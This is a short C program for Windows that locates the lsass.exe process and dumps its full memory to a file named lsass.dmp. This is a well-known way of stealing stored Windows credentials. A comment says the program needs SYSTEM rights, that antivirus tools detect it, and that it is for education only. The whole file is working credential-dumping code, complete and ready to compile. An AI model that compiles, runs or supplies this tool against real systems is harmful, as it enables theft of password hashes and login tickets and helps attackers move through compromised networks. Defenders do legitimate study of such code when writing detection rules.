#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <Dbghelp.h>


/*
This code locates the lsass.exe process and dumps it's memory contents into a file called lsass.dmp
It needs to be ran as NT AUTHORITY/SYSTEM

Keep in mind that this code is detected by most AV engines and should be used for education purposes only!
*/

int findLsass() {
    int pid = 0;
    HANDLE hSnapshot;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    BOOL first = Process32First(hSnapshot, &entry);

    while (Process32Next(hSnapshot, &entry)) {
        if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
            pid = entry.th32ProcessID;
        }
    }

    return pid;


}


HANDLE getHandle(int pid) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    return hProc;

}

int main() {

    int lsid = findLsass();
    printf("Found LSASS! PID: %d\n", lsid);
    HANDLE out = CreateFileW(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hLsass = getHandle(lsid);
    if (hLsass != INVALID_HANDLE_VALUE) {
        printf("Dumping LSASS!\n");
        if (!MiniDumpWriteDump(hLsass, lsid, out, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
            printf("Dump Failed! error: %08X", GetLastError());
        }

    }
    else {

        printf("Could not get a handle to LSASS! Error ID: %d", GetLastError());

    }



    return 0;
}